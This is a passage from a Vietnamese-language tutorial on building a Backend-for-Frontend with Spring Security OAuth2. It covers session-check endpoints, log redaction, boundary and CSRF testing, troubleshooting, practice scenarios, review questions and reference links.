Browser clock có thể sai, tab có thể bị treo và session có thể bị revoke server-side. BFF phải kiểm tra phiên ở mọi request; frontend timer chỉ là UX optimization.

### 30.3. `GET /api/me`

Một endpoint kiểm tra phiên có thể trả:

```json
{
  "authenticated": true,
  "displayName": "Alice"
}
```

Không trả:

```json
{
  "accessToken": "...",
  "refreshToken": "...",
  "idToken": "...",
  "sessionId": "..."
}
```

Chỉ trả dữ liệu identity tối thiểu cần hiển thị, sau khi kiểm soát quyền và xử lý privacy.

---

## 31. Monitoring và audit của BFF

Nên quan sát:

- Số lần login thành công/thất bại.
- OAuth2 `state`/callback errors.
- CSRF rejections và các origins liên quan.
- Số active sessions, session creation/invalidations.
- Session store latency/error rate.
- Authorized client store latency/errors.
- Access token refresh attempts và `invalid_grant`.
- Refresh token rotation conflicts.
- Token Endpoint 429/5xx.
- Resource Server 401/403/5xx.
- API proxy latency, downstream retries và timeouts.
- Cross-origin requests bị từ chối.
- Logout/revocation results.

### 31.1. Không log secrets

Không ghi:

```text
Cookie: SESSION=...
Authorization: Bearer ...
access_token
refresh_token
id_token
client_secret
code_verifier
authorization_code
client_assertion
```

Một số authorization codes nằm trên callback query. Reverse proxies, access logs và APM cần được cấu hình tránh ghi toàn bộ URL query hoặc redact `code`/`state` khi có yêu cầu.

### 31.2. Các log metadata có thể hữu ích

```text
event=bff_downstream_call
requestId=req-736
registrationId=corporate
principalRef=<pseudonymized>
upstream=orders-api
status=200
elapsedMs=87
```

Không đưa raw user email vào high-cardinality metrics labels nếu không cần; tuân thủ chính sách dữ liệu cá nhân và retention.

---

## 32. Kiểm thử ranh giới browser–backend–API

Một BFF không được xem là an toàn chỉ vì `oauth2Login()` hoạt động. Cần kiểm thử **những dữ liệu không được vượt ranh giới**.

### 32.1. Test cookie flags

Sau login, kiểm tra `Set-Cookie`:

```text
HttpOnly
Secure
SameSite hợp lý
Path/Domain phù hợp
```

Với prefix `__Host-`, phải xác minh đồng thời Secure, Path=/ và không có Domain.

### 32.2. Test frontend không thấy OAuth2 tokens

Kiểm tra:

- HTML response không chứa raw tokens.
- `/api/me` chỉ trả DTO.
- API response không serialize `OAuth2AuthorizedClient`.
- JavaScript bundle/initial state không có access/refresh tokens.
- Không có OAuth2 tokens trong localStorage/sessionStorage/IndexedDB do ứng dụng ghi.
- Không phát token trong cookie, header hoặc redirect URL trả cho browser.

Kiểm tra cũng phải bao gồm error responses, debugging endpoints và upstream response copying.

### 32.3. Test CSRF với MockMvc

Spring Security Test có thể hỗ trợ:

```java
import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.csrf;
```

Một request POST có session authentication nhưng không có CSRF token nên bị từ chối theo policy.

Request có CSRF token hợp lệ có thể đi tiếp đến business authorization. Không dùng `.with(csrf())` cho mọi test rồi quên rằng frontend thật cần gửi header/token.

### 32.4. Test OAuth2 login và authorized client

`oauth2Login()` test post-processor có thể mô phỏng authentication, nhưng **không tự kiểm thử** Authorization Code redirect, PKCE/state/nonce, Token Endpoint hay actual authorized client persistence.

Cần tách:

1. SecurityFilterChain/session tests.
2. OAuth2 callback integration tests.
3. Authorized client store tests.
4. Downstream API client tests.
5. End-to-end login browser tests.

### 32.5. Test API token không bị leak

Với mock Orders API, xác nhận:

```text
BFF -> Orders:
    Authorization: Bearer fake-access-token
    Không có Cookie: SESSION...
```

Với mock browser client, xác nhận:

```text
Orders API response chuyển thành DTO
    -> Không có access_token/refresh_token/sessionId
```

### 32.6. Test XSS và CSRF không bị đánh đồng

- CSRF test: cross-site form/request thiếu CSRF token phải bị từ chối.
- XSS test: output encoding/CSP và dynamic HTML phải ngăn chạy script độc hại.
- Session fixation: session ID có được rotate sau authentication.
- Logout: cookie cũ có còn truy cập API được không.
- Origin/CORS: origin không được phép có đọc credentialed responses được không.
- SSRF: BFF có ngăn proxy tới host do user tự chọn không.
- Tenant isolation: Alice có gọi API bằng token của Bob được không.

### 32.7. Test nhiều nodes

Test giả lập:

```text
1. Alice login qua pod A.
2. Request /api/orders được chuyển tới pod B.
3. Pod B load SecurityContext từ shared session store.
4. Pod B load authorized client của Alice từ đúng store.
5. Token refresh xảy ra đúng một cách theo concurrency policy.
```

Chỉ test một JVM với InMemory service không chứng minh distributed session/token architecture hoạt động đúng.

---

## 33. Những lỗi phổ biến và cách xử lý

| Triệu chứng | Nguyên nhân có thể | Hướng xử lý |
|---|---|---|
| Login thành công nhưng SPA không gọi được `/api/me` | Cookie không được set/sent, CORS credentials hoặc session sai | Kiểm tra cookie flags, origin và session repository |
| `authorization_request_not_found` sau callback | Mất session, SameSite/response mode không phù hợp, proxy redirect sai | Kiểm tra state store và callback cookies |
| Callback redirect thành `http://internal:8080` | Forwarded headers/proxy config sai | Cấu hình trusted proxy và redirect URI |
| Browser thấy `access_token` trong JSON | Endpoint debug hoặc DTO serialize nhầm authorized client | Xóa token exposure, chỉ trả business DTO |
| Browser không thấy cookie trong `document.cookie` | Session cookie có HttpOnly | Đây là hành vi đúng |
| Browser tự gửi cookie dù JavaScript không đọc được | Cookie HTTP semantics | Đây là hành vi đúng, phải bảo vệ CSRF |
| POST `/api/orders` trả 403 | Thiếu CSRF token hoặc business permission | Kiểm tra riêng CSRF với authorization |
| SPA fetch nhận HTML IdP thay JSON | API 302 redirect login | Thiết kế API 401 và top-level login navigation |
| Cookie biến mất trên cross-site POST callback | SameSite Lax/Strict không tương thích `form_post` | Thiết kế response mode/cookie policy |
| Login mất sau chuyển pod | Session ở RAM local | Spring Session/shared store/sticky strategy phù hợp |
| User authenticated nhưng token downstream không tìm thấy | Authorized client ở InMemory pod khác | Shared authorized client service hoặc repository thiết kế đúng |
| API B trả 401 | Access token sai aud/iss/expiry | Kiểm tra token target và Resource Server |
| API B trả 403 | Token không đủ scope/quyền | Không fallback privileged client token |
| BFF refresh liên tục | Cache key/principal thay đổi, skew quá lớn | Sửa stable principal, lifetime và manager |
| `invalid_grant` xuất hiện khi dashboard nhiều requests | Refresh token rotation race | Single-flight/conditional storage logic |
| Logout xong còn token trong JDBC | Session invalidation không xóa service store | Remove/revoke authorized clients theo policy |
| Session ID được gửi sang upstream API | Blind header forwarding | Allowlist outbound headers |
| Token bị gửi sang host lạ | Generic proxy/redirect | Enforce upstream allowlist và redirect policy |
| Cookie `SameSite=None` nhưng browser vẫn chặn | Third-party cookie restrictions | Ưu tiên same-origin/same-site architecture |
| XSS vẫn gọi được API dù cookie HttpOnly | XSS chạy trong same origin | CSP, escaping, backend authz/step-up |
| Hệ thống CORS `*` với credentials | Cấu hình không hợp lệ/rủi ro | Exact origin allowlist, credentials policy |
| `STATELESS` làm mất login | Session policy không phù hợp BFF | Cho phép server-side session |
| Token lưu trong cookie để tránh DB | Sai ranh giới kiến trúc BFF | Dùng opaque session cookie và backend token storage |

### 33.1. Quy trình chẩn đoán khi “mất đăng nhập”

1. Kiểm tra browser có nhận session cookie sau callback không.
2. Cookie có `Secure` khi public HTTPS không.
3. Domain/Path/SameSite có hợp lệ cho đường login/callback/API không.
4. Mã `state` có khớp authorization request đã lưu không.
5. Reverse proxy có chuyển `Host`/`Forwarded` đúng theo trust policy không.
6. BFF có thể load server session ở node hiện tại không.
7. SecurityContext có được lưu/khôi phục sau login không.
8. OAuth2AuthorizedClient có cùng registration/principal và đúng store không.
9. API endpoint trả 401 hay downstream Resource Server trả 401.
10. Có session invalidation/logout/TTL hoặc session fixation migration tác động không.

Không cần log session ID hoặc access token để thực hiện các bước này.

---

## 34. Tình huống vận dụng

### Tình huống A — React app gọi API có OAuth2 token trong Local Storage

**Vấn đề:** JavaScript vẫn giữ access token. Đây không phải BFF backend-only token model.

**Hướng giải quyết:** để BFF giữ token và nhận cookie phiên; frontend gọi BFF API.

### Tình huống B — JavaScript không đọc được HttpOnly cookie

**Nhận định:** Đây là chủ đích. Browser tự gắn cookie khi request đúng domain/path/SameSite policy; không cần JS đọc cookie để sử dụng phiên.

### Tình huống C — XSS gửi POST bằng session cookie

**Nhận định:** HttpOnly không chặn XSS thực hiện hành động trong origin. BFF cần chống XSS, CSRF và backend authorization.

### Tình huống D — OAuth2 callback `form_post` không tìm thấy state

**Nhận định:** Cookie SameSite/Lax có thể không gửi trên cross-site POST. Không tắt `state`; điều chỉnh response mode/cookie flow phù hợp.

### Tình huống E — API `POST /api/orders` bị CSRF 403

**Nhận định:** Phải gửi CSRF token qua header phù hợp. Không tắt CSRF chỉ để frontend hết lỗi.

### Tình huống F — User đăng nhập trên pod A, request tiếp theo đến pod B

**Nhận định:** Session và authorized client store có thể không được chia sẻ. Cần kiểm tra cả hai lớp storage, không chỉ sticky sessions.

### Tình huống G — Backend dùng `client_credentials` gọi API thay user

**Nhận định:** Token service và token user có quyền khác nhau. Không fallback sang service token để vượt authorization của user.

### Tình huống H — Browser tự chọn URL cho BFF proxy

**Nhận định:** Có nguy cơ SSRF/token exfiltration. Dùng upstream allowlist và API endpoints nghiệp vụ cố định.

### Tình huống I — ID Token được trả vào `window.__USER__`

**Nhận định:** ID Token không cần thiết để browser hiển thị tên người dùng. Trả các trường profile tối thiểu qua JSON, không raw ID Token.

### Tình huống J — Refresh token được lưu trong HttpOnly cookie

**Nhận định:** Cookie vẫn giữ OAuth token ở browser, không phải backend-only BFF. Dùng opaque session ID và lưu token phía server.

### Tình huống K — Logout BFF nhưng token vẫn còn trong JDBC

**Nhận định:** Session invalidation và authorized client deletion là hai hoạt động riêng. Cần policy remove/revoke cho user disconnect/logout.

### Tình huống L — Mở dashboard phát 6 API requests lúc token sắp hết hạn

**Nhận định:** Có nguy cơ refresh token rotation race. Cân nhắc single-flight theo authorized client key, double-check state sau lock và conditional updates.

### Tình huống M — SPA và BFF khác subdomain

**Nhận định:** Có thể same-site nhưng cross-origin. Cần credentials CORS và session cookie host policy, vẫn bảo vệ CSRF.

### Tình huống N — SPA và BFF khác site hoàn toàn

**Nhận định:** Third-party cookie restrictions và SameSite=None có thể khiến phiên không ổn định. Cân nhắc same-origin reverse proxy.

### Tình huống O — Access token chưa hết hạn nhưng session đã hết hạn

**Nhận định:** Browser không có phiên BFF hợp lệ nên không được gọi API chỉ vì backend vẫn còn token cũ. Xử lý theo logout/session policy.

### Tình huống P — Session còn hạn nhưng access token đã hết hạn

**Nhận định:** BFF dùng refresh token nếu được AS cấp và còn hiệu lực, hoặc yêu cầu user reauthorize. Browser không cần nhận token.

### Tình huống Q — API B trả 403 nhưng BFF đăng nhập thành công

**Nhận định:** User authentication không đồng nghĩa đủ downstream authorization. Kiểm tra scopes/audience và resource ownership.

### Tình huống R — Reverse proxy trả `Set-Cookie` của upstream

**Nhận định:** BFF không nên pass-through cookies từ API nội bộ nếu không có contract rõ; tránh đụng session cookies và rò rỉ credential.

### Tình huống S — OIDC Logout không chấm dứt SSO tại IdP

**Nhận định:** BFF session logout, OIDC OP session logout và OAuth2 token revocation là những luồng riêng; cần tích hợp RP-Initiated Logout nếu yêu cầu.

### Tình huống T — SPA cần offline-first và gọi API khi BFF không online

**Nhận định:** BFF phụ thuộc vào backend online để proxy protected APIs. Nếu sản phẩm bắt buộc offline direct API, phải thiết kế kiến trúc/token model khác và threat model riêng.

---

## 35. Câu hỏi tự kiểm tra

**1. Trong BFF, ai là OAuth2 confidential client?**  
Spring Boot backend, không phải browser JavaScript.

**2. Browser giữ gì để xác thực với BFF?**  
Một opaque session cookie, thường HttpOnly/Secure/SameSite theo policy.

**3. Access token và refresh token nằm ở đâu?**  
Ở backend authorized client store/session/service, không đưa cho JavaScript.

**4. Session cookie có phải access token không?**  
Không. Nó là credential tham chiếu BFF session.

**5. HttpOnly có ngăn XSS gọi API không?**  
Không. Nó hạn chế JavaScript đọc cookie, không ngăn script cùng origin thực hiện requests.

**6. Vì sao BFF cần CSRF protection?**  
Browser tự gửi cookie theo cookie policy, có thể bị lợi dụng trong cross-site requests.

**7. OAuth2 `state` có thay CSRF token của API không?**  
Không. `state` phục vụ OAuth2 authorization response correlation; API CSRF token bảo vệ state-changing requests.

**8. Vì sao callback GET thường hợp với SameSite=Lax?**  
Lax cho phép cookie trong một số top-level cross-site GET navigations, nhưng không mặc định cho POST callback.

**9. Tại sao OIDC ID Token không gửi tới Resource Server?**  
ID Token phục vụ xác thực user tại client, không phải API access token.

**10. OAuth2AuthorizedClientService thường dùng khóa gì?**  
Client registration ID và principal name.

**11. Spring Session có tự chia sẻ mọi OAuth2AuthorizedClient không?**  
Không. Cần xem authorized client repository/service thực tế; session và authorized client store có thể tách nhau.

**12. Session timeout có giống access token expiry không?**  
Không. Hai lifecycles phải được quản lý riêng.

**13. Khi access token hết hạn BFF làm gì?**  
Manager có thể refresh/cấp lại token theo grant và policy, hoặc yêu cầu reauthorization nếu không thể.

**14. Khi user logout, refresh token ở JDBC có tự bị revoke không?**  
Không mặc định. Cần chính sách remove/revoke riêng.

**15. Vì sao không dùng BFF làm proxy cho URL bất kỳ?**  
Nguy cơ SSRF và gửi access token tới host không tin cậy.

**16. Frontend/BFF khác subdomain có phải khác origin không?**  
Có, vì host khác nhau; có thể vẫn same-site. Cần cấu hình credentialed CORS phù hợp.

**17. Browser có cần biết client secret không?**  
Không. Client secret phải giữ ở backend/secret management.

**18. BFF có tự thay business authorization của Resource Server không?**  
Không. API downstream vẫn phải kiểm tra issuer/audience/scope/ownership.

**19. Vì sao refresh token rotation dễ lỗi khi nhiều requests?**  
Nhiều requests có thể cùng dùng RT1; AS vô hiệu hóa RT1 sau lần đầu và các lần sau bị `invalid_grant`.

**20. Token-Mediating Backend có khác BFF backend-only không?**  
Có. Nếu backend trả OAuth2 access token cho JavaScript, ranh giới lưu token đã khác BFF.

**21. Có thể giữ access token trong cookie HttpOnly phía browser và gọi là “không có token trong browser” không?**  
Không. Cookie vẫn là browser storage chứa token, dù JavaScript không đọc trực tiếp.

**22. Vì sao không nên phản chiếu nguyên `OAuth2AuthorizedClient` qua JSON?**  
Object có thể chứa raw access/refresh tokens và metadata không dành cho browser.

**23. Khi SPA nhận redirect HTML của IdP qua fetch, nên làm gì?**  
Thiết kế API 401/session-expired contract và dùng top-level browser navigation cho login.

**24. Cấu hình `SessionCreationPolicy.STATELESS` phù hợp cho BFF session login truyền thống không?**  
Không. Nó thường trái với yêu cầu duy trì server-side session.

**25. Khi Spring Boot đứng sau reverse proxy, cần quan tâm gì?**  
Trusted forwarded headers, HTTPS scheme, redirect URI, cookie Secure và host/path.

## 36. Tổng kết

| Thành phần | Vị trí | Vai trò |
|---|---|---|
| Browser/SPA | Client runtime | Render UI; gọi BFF bằng cookie session |
| Session cookie | Browser | Opaque credential định danh phiên BFF |
| BFF | Spring Boot server | OAuth2 client, xác thực session, API gateway có kiểm soát |
| SecurityContext | BFF session | Authentication/authorities của user |
| OAuth2AuthorizedClient | BFF authorized client store | Access token, refresh token nếu có, expiry và registration |
| OpenID Provider/AS | Identity infrastructure | Authentication, authorization, phát và refresh tokens |
| Resource Server | API downstream | Xác minh Bearer token và resource authorization |
| CSRF token | Browser + BFF validation state | Bảo vệ requests thay đổi dữ liệu dựa trên cookie |
| `state`/PKCE/`nonce` | OAuth2/OIDC login | Bảo vệ authorization flow và ID Token validation |
| Spring Session | Shared session storage | Cho phép nhiều BFF instances load session theo thiết kế |
| Authorized client service | Backend token storage | Lưu/truy xuất tokens theo registration/principal |
| `HttpOnly` | Cookie flag | Hạn chế JavaScript đọc session cookie |
| `Secure` | Cookie flag | Hạn chế gửi cookie trên kết nối không phải HTTPS |
| `SameSite` | Cookie policy | Giảm một số cross-site cookie sends, không thay CSRF |
| CORS | Browser cross-origin policy | Kiểm soát cross-origin JavaScript access, không thay CSRF |
| CSP/output encoding | Frontend/security headers | Giảm XSS, không tự bảo vệ mọi business operations |
| Logout/revocation | BFF + AS/OP | Chấm dứt session và token authorization theo policy |

### Kết luận

**BFF chuyển trách nhiệm quản lý OAuth2 access/refresh tokens từ browser sang backend.** Browser chỉ gửi một **opaque session cookie** tới BFF; Spring Security khôi phục Authentication, tìm `OAuth2AuthorizedClient`, quản lý token lifetime và gửi Bearer access token tới **Resource Server được phép**.

Lợi ích lớn nhất là giảm rủi ro JavaScript trực tiếp lấy và lưu trữ OAuth2 tokens. Nhưng vì BFF dựa trên cookie session, nó **vẫn cần CSRF protection**, còn `HttpOnly` không chặn malicious same-origin JavaScript gửi API calls. Backend phải bảo vệ cả session ID, token store, CORS, XSS, SSRF, refresh-token rotation, logout, audience và quyền của từng user/tenant.

Để triển khai tốt, nên ưu tiên frontend–BFF **same-origin**, server-side session storage phù hợp quy mô, cookies có flags an toàn và **không có endpoint trả raw OAuth2 token cho frontend**. Một BFF chỉ thực sự giữ đúng ranh giới khi **browser không nhận OAuth2 tokens trong bất kỳ response, cookie, HTML hay browser storage nào**.

## Tài liệu tham khảo chính thức

- [IETF — OAuth 2.0 for Browser-Based Applications](https://datatracker.ietf.org/doc/draft-ietf-oauth-browser-based-apps/) — các kiến trúc browser OAuth2, BFF và token-mediating backend (trạng thái tài liệu có thể thay đổi).
- [Spring Security — OAuth2 Login (Servlet)](https://docs.spring.io/spring-security/reference/servlet/oauth2/login/index.html) — Authorization Code/OIDC Login, redirect/callback và session.
- [Spring Security — OAuth2 Client Authorized Clients](https://docs.spring.io/spring-security/reference/servlet/oauth2/client/authorized-clients.html) — authorized client managers, repository/service và token lifecycle.
- [Spring Security — CSRF (Servlet)](https://docs.spring.io/spring-security/reference/servlet/exploits/csrf.html) — CSRF handling với cookies và SPA.
- [Spring Security — Session Management (Servlet)](https://docs.spring.io/spring-security/reference/servlet/authentication/session-management.html) — session handling, fixation protection, policies.
- [Spring Security — Logout](https://docs.spring.io/spring-security/reference/servlet/authentication/logout.html) — session invalidation và logout handlers.
- [Spring Session](https://docs.spring.io/spring-session/reference/) — HTTP session sharing với Redis/JDBC và cookie configuration.
- [OWASP — Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) — token patterns, SameSite và origin checks.
- [OWASP — Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) — session ID, cookie flags, lifecycle.
- [RFC 6749 — OAuth 2.0 Authorization Framework](https://www.rfc-editor.org/rfc/rfc6749) — OAuth2 grants và tokens.
- [RFC 7636 — PKCE](https://www.rfc-editor.org/rfc/rfc7636) — Authorization Code protection.
- [RFC 9700 — OAuth 2.0 Security Best Current Practice](https://www.rfc-editor.org/rfc/rfc9700) — OAuth2 security considerations.
- [OpenID Connect RP-Initiated Logout](https://openid.net/specs/openid-connect-rpinitiated-1_0.html) — logout tại OIDC Provider.
